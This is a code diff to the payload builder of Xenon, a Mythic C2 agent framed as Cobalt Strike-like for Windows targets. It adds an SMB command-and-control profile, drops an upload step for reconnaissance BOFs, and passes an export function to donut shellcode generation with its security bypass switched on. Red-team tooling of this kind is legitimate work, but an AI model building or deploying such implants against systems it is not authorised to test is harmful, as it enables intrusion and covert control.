@@ -20,7 +20,7 @@ class XenonAgent(PayloadType):
     wrapped_payloads = []
     note = """A Cobalt Strike-like agent for Windows targets. Version: v0.0.3"""
     supports_dynamic_loading = True
-    c2_profiles = ["httpx"]
+    c2_profiles = ["httpx", "smb"]
     mythic_encrypts = True
     translation_container = "XenonTranslator"
     build_parameters = [
@@ -100,7 +100,12 @@ class XenonAgent(PayloadType):
         }
         stdout_err = ""
         for c2 in self.c2info:
-            profile = c2.get_c2profile()
+            
+            # We will assume they've only selected one C2 profile
+            c2_profile = c2.get_c2profile()
+            selected_profile = c2_profile.get('name')
+            logging.info(f"[+] {selected_profile} C2 Profile Selected!")
+            
             # Set each key value from HTTPX profile in Config dictionary
             for key, val in c2.get_parameters_dict().items():
                 # Check for encryption
@@ -112,7 +117,7 @@ class XenonAgent(PayloadType):
                         Config['aes_key'] = val['enc_key']
                     stdout_err += "Setting {} to {}".format(key, val["enc_key"] if val["enc_key"] is not None else "")
                 
-                # Check for httpx config file
+                # httpx config file
                 elif (key == 'raw_c2_config'):
                     agentConfigFileId = val
                     
@@ -175,9 +180,9 @@ class XenonAgent(PayloadType):
         copy_tree(str(self.agent_code_path), agent_build_path.name)
 
 
-        ###############################
+        #######################################
         ### Compile Postex named pipe stub ####
-        ###############################
+        #######################################
         
         # CWD - Xenon/Payload_Type/xenon/
         stub_dir = 'xenon/agent_code/stub'
@@ -228,42 +233,6 @@ class XenonAgent(PayloadType):
 
         except Exception as e:
             logging.exception(f"Error uploading {bof_filename}: {str(e)}")
-
-
-        # Upload all Situational Awareness BOFs to Mythic server 
-        SA_MODULE_PATH = pathlib.Path(".") / "xenon" / "agent_code" / "modules" / "trustedsec_bofs"
-
-        # If inline_execute is included upload all of these for aliases
-        if "inline_execute" in self.commands.get_commands():
-            logging.info(f"Starting Uploading Situational Awareness BOFs.")
-            # Walk through the BOF directory and upload only .x64.o files
-            for root, _, files in os.walk(SA_MODULE_PATH):
-                for f in files:
-                    if f.endswith(".x64.o"):
-                        bof_path = os.path.join(root, f)
-                        bof_filename = os.path.basename(bof_path)
-
-                        try:
-                            with open(bof_path, "rb") as bof_file:
-                                bof_bytes = bof_file.read()
-
-                            # Upload BOF to Mythic
-                            file_resp = await SendMythicRPCFileCreate(
-                                MythicRPCFileCreateMessage(
-                                    PayloadUUID=self.uuid,
-                                    Filename=bof_filename,
-                                    DeleteAfterFetch=False,
-                                    FileContents=bof_bytes
-                                )
-                            )
-
-                            if file_resp.Success:
-                                logging.info(f"Successfully uploaded: {bof_filename}")
-                            else:
-                                raise Exception(f"Failed to upload {bof_filename}: {file_resp.Error}")
-
-                        except Exception as e:
-                            logging.exception(f"Error uploading {bof_filename}: {str(e)}")
 
         # Notify: Installed Modules
         await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
@@ -519,6 +488,7 @@ class XenonAgent(PayloadType):
             if self.get_parameter('output_type') == 'shellcode':
                 bin_file = f"{agent_build_path.name}/loader.bin"
                 # Use donut-shellcode here
+                export_function = self.get_parameter('dll_export_function')
                 donut.create(file=output_path, output=bin_file, arch=3, bypass=1, method=export_function)
    
                 if os.path.exists(bin_file):
